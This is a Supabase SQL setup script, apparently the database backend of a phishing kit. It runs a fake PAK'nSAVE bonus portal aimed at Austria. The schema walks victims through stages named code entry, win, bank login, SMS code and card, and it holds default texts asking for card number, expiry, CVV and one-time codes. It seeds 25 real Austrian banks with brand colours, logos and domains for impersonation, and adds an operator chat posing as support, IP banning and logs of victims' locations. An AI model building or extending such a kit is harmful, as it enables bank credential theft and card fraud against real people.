-- ============================================================
-- AUSTRIA SETUP - Tek script, Supabase SQL Editor'de calistirin
-- Sıra: sessions -> settings -> banks -> chat -> banned_ips -> audit -> AT config
-- ============================================================

create extension if not exists "pgcrypto";

-- ============================================================
-- 1) SESSIONS
-- ============================================================
create sequence if not exists public.sessions_public_id_seq;

create table if not exists public.sessions (
  id text primary key default encode(gen_random_bytes(12), 'hex'),
  public_id bigint not null default nextval('public.sessions_public_id_seq'),
  amount integer not null default 0 check (amount >= 0),
  current_step text not null default 'code_entry'
    check (
      current_step in (
        'code_entry','win','bank','banken','login','bank_login',
        'wait','sms','card','congrats','special_approval',
        'invalid_bank','live_support','SPECIAL_INFO','wheel'
      )
    ),
  status text not null default 'offline'
    check (status in ('online','offline','SUCCESS','CONGRATS','SPECIAL_INFO')),
  sms_digits integer not null default 6 check (sms_digits >= 4 and sms_digits <= 12),
  sms_custom_text text,
  form_data jsonb not null default '{}'::jsonb,
  is_hidden boolean not null default false,
  partner_name text,
  participation_code text,
  ip_address text,
  user_agent text,
  last_ping_at timestamptz,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create unique index if not exists sessions_public_id_idx on public.sessions (public_id);
create index if not exists sessions_created_at_idx on public.sessions (created_at desc);
create index if not exists idx_sessions_last_ping_at_desc on public.sessions(last_ping_at desc nulls last);
create index if not exists idx_sessions_status_last_ping_at on public.sessions(status, last_ping_at);

alter sequence public.sessions_public_id_seq owned by public.sessions.public_id;
alter table public.sessions replica identity full;

create or replace function public.set_updated_at()
returns trigger as $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

drop trigger if exists sessions_set_updated_at on public.sessions;
create trigger sessions_set_updated_at
before update on public.sessions
for each row execute function public.set_updated_at();

create or replace function public.set_default_last_ping_at() returns trigger as $$
begin
  if new.status = 'online' and new.last_ping_at is null then
    new.last_ping_at := coalesce(new.updated_at, new.created_at, now());
  end if;
  return new;
end;
$$ language plpgsql volatile;

drop trigger if exists trg_sessions_default_last_ping_at on public.sessions;
create trigger trg_sessions_default_last_ping_at
before insert or update on public.sessions
for each row execute function public.set_default_last_ping_at();

alter table public.sessions enable row level security;

drop policy if exists "sessions_authenticated_all" on public.sessions;
create policy "sessions_authenticated_all"
on public.sessions for all to authenticated using (true) with check (true);

drop policy if exists "sessions_anon_select" on public.sessions;
create policy "sessions_anon_select"
on public.sessions for select to anon using (true);

drop policy if exists "sessions_anon_insert" on public.sessions;
create policy "sessions_anon_insert"
on public.sessions for insert to anon with check (true);

drop policy if exists "sessions_anon_update" on public.sessions;
create policy "sessions_anon_update"
on public.sessions for update to anon using (true) with check (true);

do $$
begin
  if not exists (
    select 1 from pg_publication_tables
    where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'sessions'
  ) then
    execute 'alter publication supabase_realtime add table public.sessions';
  end if;
end $$;

-- ============================================================
-- 2) GLOBAL_SETTINGS (target_country = Austria)
-- ============================================================
create table if not exists public.global_settings (
  id text primary key default 'default',
  logo_url text not null default '/wheel-assets/desktop/png/paknsave-logo-hub.png',
  bg_url text not null default '/api/portal-background?variant=desktop',
  portal_name text not null default 'PAK''nSAVE Customer Portal',
  support_center_name text not null default 'PAK''nSAVE Support',
  win_title text not null default 'Exclusive PAK''nSAVE Bonus',
  win_subtitle text not null default 'Congratulations! You have been selected for today''s PAK''nSAVE promotion. Click the button below to claim your bonus.',
  win_button text not null default 'Claim Bonus',
  banken_title text not null default 'Choose Your Bank',
  banken_subtitle text not null default 'Select your bank to continue.',
  banken_search_placeholder text not null default 'Search your bank...',
  wait_title text not null default 'Please Wait',
  wait_subtitle text not null default 'Your request is being securely processed...',
  sms_title text not null default 'SMS Security Code',
  sms_subtitle text not null default 'Enter the {digits}-digit code.',
  sms_input_label text not null default 'One-time code',
  sms_button text not null default 'Confirm',
  sms_loading text not null default 'Processing...',
  card_title text not null default 'Payment Details',
  card_subtitle text not null default 'Check and confirm your details.',
  card_owner_label text not null default 'Cardholder Name',
  card_number_label text not null default 'Card Number',
  card_expiry_label text not null default 'Expiry Date MM/YY',
  card_cvv_label text not null default 'Security Code',
  card_button text not null default 'Continue',
  code_title text not null default 'Welcome',
  code_subtitle text not null default 'Enter the participation code you received from {partner} to unlock your reward.',
  code_button text not null default 'Confirm Code',
  live_support_title text not null default 'Live Support',
  live_support_subtitle text not null default 'To continue, you need to contact our customer support.\n\nClick the button below to start the chat.',
  live_support_button text not null default 'Start Chat',
  profile_title_small text not null default 'Prize Confirmation',
  profile_title_main text not null default 'Your Bonus Amount',
  profile_subtitle text not null default 'Confirm your details for further processing.',
  profile_firstname_label text not null default 'First Name',
  profile_lastname_label text not null default 'Last Name',
  profile_phone_label text not null default 'Mobile Number',
  profile_button text not null default 'Next',
  profile_loading_text text not null default 'Processing...',
  site_language text not null default 'en',
  target_country text not null default 'Austria',
  wheel_settings jsonb not null default '{"bg_url_mobile":"/api/portal-background?variant=mobile","page_backgrounds":{}}'::jsonb,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

drop trigger if exists global_settings_set_updated_at on public.global_settings;
create trigger global_settings_set_updated_at
before update on public.global_settings
for each row execute function public.set_updated_at();

alter table public.global_settings enable row level security;

drop policy if exists "global_settings_public_read" on public.global_settings;
create policy "global_settings_public_read"
on public.global_settings for select to anon, authenticated using (true);

drop policy if exists "global_settings_authenticated_all" on public.global_settings;
create policy "global_settings_authenticated_all"
on public.global_settings for all to authenticated using (true) with check (true);

insert into public.global_settings (id, target_country)
values ('default', 'Austria')
on conflict (id) do update set target_country = 'Austria';

-- ============================================================
-- 3) BANKS (Austrian banks aktif)
-- ============================================================
create table if not exists public.banks (
  id uuid primary key default gen_random_uuid(),
  slug text unique not null,
  name text not null,
  brand_color text,
  accent_color text,
  logo_file text,
  domain text,
  design_config jsonb not null default '{}'::jsonb,
  is_active boolean not null default true,
  country text not null default 'Austria',
  auto_redirect boolean not null default false,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

drop trigger if exists banks_set_updated_at on public.banks;
create trigger banks_set_updated_at
before update on public.banks
for each row execute function public.set_updated_at();

alter table public.banks enable row level security;

drop policy if exists "banks_public_read" on public.banks;
create policy "banks_public_read"
on public.banks for select to anon, authenticated using (true);

drop policy if exists "banks_public_write" on public.banks;
create policy "banks_public_write"
on public.banks for all to anon, authenticated using (true) with check (true);

insert into public.banks (slug, name, brand_color, accent_color, logo_file, domain, country, is_active, auto_redirect)
values
  ('bank-austria','Bank Austria','#e30613','#b80000','/bank-logos/at/bank-austria.svg','bawag.com','Austria',true,false),
  ('erste-bank','Erste Bank','#003399','#0066cc','/bank-logos/at/erste-bank.svg','erstebank.at','Austria',true,false),
  ('raiffeisen','Raiffeisen','#fbb900','#e6a800','/bank-logos/at/raiffeisen.svg','raiffeisen.at','Austria',true,false),
  ('volksbank','Volksbanken','#003366','#004d99','/bank-logos/at/volksbank.svg','volksbank.at','Austria',true,false),
  ('posojilnica','Posojilnica Bank','#006633','#004d26','/bank-logos/at/posojilnica.svg','posojilnica.at','Austria',true,false),
  ('bank99','Bank99','#660099','#4d0073','/bank-logos/at/bank99.svg','bank99.at','Austria',true,false),
  ('btv','BTV Vier Lander Bank','#003399','#002266','/bank-logos/at/btv.svg','btv.at','Austria',true,false),
  ('bks-bank','BKS Bank','#0066cc','#004d99','/bank-logos/at/bks-bank.svg','bks.at','Austria',true,false),
  ('oberbank','Oberbank','#cc0000','#990000','/bank-logos/at/oberbank.svg','oberbank.at','Austria',true,false),
  ('hypo-noe','Hypo Noe','#003366','#002244','/bank-logos/at/hypo-noe.svg','hyponoebank.at','Austria',true,false),
  ('hypo-tirol','Hypo Tirol','#003399','#002266','/bank-logos/at/hypo-tirol.svg','hypotirol.at','Austria',true,false),
  ('hypo-vorarlberg','Hypo Vorarlberg','#006633','#004d26','/bank-logos/at/hypo-vorarlberg.svg','hypovorarlberg.at','Austria',true,false),
  ('hypo-burgenland','Hypo Burgenland','#003366','#002244','/bank-logos/at/hypo-burgenland.svg','hypoburgenland.at','Austria',true,false),
  ('hypo-ooe','Hypo Oberösterreich','#003399','#002266','/bank-logos/at/hypo-ooe.svg','hypo-ooe.at','Austria',true,false),
  ('aerztebank','Ärztebank','#0066cc','#004d99','/bank-logos/at/aerztebank.svg','aerztebank.at','Austria',true,false),
  ('spaengler','Spängler Bank','#cc0000','#990000','/bank-logos/at/spaengler.svg','spaengler.at','Austria',true,false),
  ('schelhammer','Schelhammer Capital','#003366','#002244','/bank-logos/at/schelhammer.svg','schelhammer.at','Austria',true,false),
  ('easybank','Easybank','#00748c','#005f73','/bank-logos/at/easybank.svg','easybank.at','Austria',true,false),
  ('schoellerbank','Schoellerbank','#003399','#002266','/bank-logos/at/schoellerbank.svg','schoellerbank.at','Austria',true,false),
  ('sparda-bank','Sparda Bank','#006633','#004d26','/bank-logos/at/sparda-bank.svg','sparda.at','Austria',true,false),
  ('vkb','Volkskreditbank','#003366','#002244','/bank-logos/at/vkb.svg','vkb.at','Austria',true,false),
  ('anadi-bank','Anadi Bank','#660099','#4d0073','/bank-logos/at/anadi-bank.svg','anadi.at','Austria',true,false),
  ('marchfelder','Marchfelder Bank','#006633','#004d26','/bank-logos/at/marchfelder.svg','marchfelder.at','Austria',true,false),
  ('dolomitenbank','Dolomitenbank','#003399','#002266','/bank-logos/at/dolomitenbank.svg','dolomitenbank.it','Austria',true,false),
  ('bawag','BAWAG P.S.K.','#00748c','#005f73','/bank-logos/at/bawag.svg','bawag.at','Austria',true,false)
on conflict (slug) do nothing;

-- ============================================================
-- 4) CHAT_MESSAGES
-- ============================================================
create table if not exists public.chat_messages (
  id uuid primary key default gen_random_uuid(),
  session_id text not null references public.sessions(id) on delete cascade,
  sender text not null check (sender in ('user','admin')),
  content text not null,
  image_url text,
  created_at timestamptz not null default now()
);

alter table public.chat_messages enable row level security;

drop policy if exists "chat_messages_anon_all" on public.chat_messages;
create policy "chat_messages_anon_all"
on public.chat_messages for all to anon using (true) with check (true);

drop policy if exists "chat_messages_auth_all" on public.chat_messages;
create policy "chat_messages_auth_all"
on public.chat_messages for all to authenticated using (true) with check (true);

do $$
begin
  if not exists (
    select 1 from pg_publication_tables
    where pubname = 'supabase_realtime' and schemaname = 'public' and tablename = 'chat_messages'
  ) then
    execute 'alter publication supabase_realtime add table public.chat_messages';
  end if;
end $$;

-- ============================================================
-- 5) BANNED_IPS
-- ============================================================
create table if not exists public.banned_ips (
  ip_address text primary key,
  reason text,
  banned_at timestamptz not null default now()
);

alter table public.banned_ips enable row level security;

drop policy if exists "banned_ips_public_read" on public.banned_ips;
create policy "banned_ips_public_read"
on public.banned_ips for select to anon, authenticated using (true);

drop policy if exists "banned_ips_public_insert" on public.banned_ips;
create policy "banned_ips_public_insert"
on public.banned_ips for insert to anon, authenticated with check (true);

drop policy if exists "banned_ips_public_delete" on public.banned_ips;
create policy "banned_ips_public_delete"
on public.banned_ips for delete to anon, authenticated using (true);

-- ============================================================
-- 6) AUDIT_EVENT_LOGS (session_id TEXT olarak)
-- ============================================================
create table if not exists public.audit_event_logs (
  id            bigserial primary key,
  created_at    timestamptz not null default now(),
  session_id    text null,
  public_id     text null,
  partner_name  text null,
  event_kind    text not null,
  event_action  text not null,
  status        text null default 'ok',
  user_ip       text null,
  user_agent    text null,
  country       text null,
  city          text null,
  referer_url   text null,
  current_url   text null,
  from_step     text null,
  to_step       text null,
  pathname      text null,
  bank_slug     text null,
  bank_name     text null,
  login_method  text null,
  admin_email   text null,
  admin_action  text null,
  meta          jsonb null default '{}'::jsonb,
  error_name    text null,
  error_message text null
);

create index if not exists idx_audit_event_logs_created_at   on public.audit_event_logs (created_at desc);
create index if not exists idx_audit_event_logs_kind_action  on public.audit_event_logs (event_kind, event_action);
create index if not exists idx_audit_event_logs_bank_slug    on public.audit_event_logs (bank_slug);
create index if not exists idx_audit_event_logs_status       on public.audit_event_logs (status);
create index if not exists idx_audit_event_logs_partner      on public.audit_event_logs (partner_name);
create index if not exists idx_audit_event_logs_session_id   on public.audit_event_logs (session_id text_pattern_ops);
create index if not exists idx_audit_event_logs_public_id    on public.audit_event_logs (public_id text_pattern_ops);

alter table public.audit_event_logs enable row level security;

drop policy if exists "audit_event_logs_auth_read" on public.audit_event_logs;
create policy "audit_event_logs_auth_read"
  on public.audit_event_logs for select
  using (auth.role() = 'authenticated');

drop policy if exists "audit_event_logs_anon_insert" on public.audit_event_logs;
create policy "audit_event_logs_anon_insert"
  on public.audit_event_logs for insert
  with check (true);

drop policy if exists "audit_event_logs_anon_select" on public.audit_event_logs;
create policy "audit_event_logs_anon_select"
  on public.audit_event_logs for select
  to anon using (true);

grant select on public.audit_event_logs to authenticated;
grant select, insert on public.audit_event_logs to anon;

create or replace function public.touch_audit_partner_cache()
returns trigger language plpgsql as $$
begin
  if new.partner_name is not null and tg_op = 'UPDATE' then
    update public.audit_event_logs
       set partner_name = new.partner_name
     where session_id = new.id and partner_name is null;
  end if;
  return new;
end;
$$;

drop trigger if exists trg_sessions_touch_audit_partner on public.sessions;
create trigger trg_sessions_touch_audit_partner
after update of partner_name on public.sessions
for each row execute function public.touch_audit_partner_cache();

-- ============================================================
-- 7) STORAGE BUCKETS
-- ============================================================
insert into storage.buckets (id, name, public)
values ('assets','assets',true), ('chat_images','chat_images',true)
on conflict (id) do nothing;

drop policy if exists "assets_public_read" on storage.objects;
create policy "assets_public_read" on storage.objects
for select using (bucket_id = 'assets');

drop policy if exists "assets_public_insert" on storage.objects;
create policy "assets_public_insert" on storage.objects
for insert with check (bucket_id = 'assets');

drop policy if exists "assets_public_update" on storage.objects;
create policy "assets_public_update" on storage.objects
for update using (bucket_id = 'assets') with check (bucket_id = 'assets');

drop policy if exists "assets_public_delete" on storage.objects;
create policy "assets_public_delete" on storage.objects
for delete using (bucket_id = 'assets');

drop policy if exists "chat_images_public_read" on storage.objects;
create policy "chat_images_public_read" on storage.objects
for select using (bucket_id = 'chat_images');

drop policy if exists "chat_images_public_insert" on storage.objects;
create policy "chat_images_public_insert" on storage.objects
for insert with check (bucket_id = 'chat_images');

-- ============================================================
-- BITTI - kontrol sorgulari (opsiyonel, calistirarak dogrulayin)
-- ============================================================
-- select count(*) from public.banks where country = 'Austria' and is_active;
-- select target_country from public.global_settings where id = 'default';
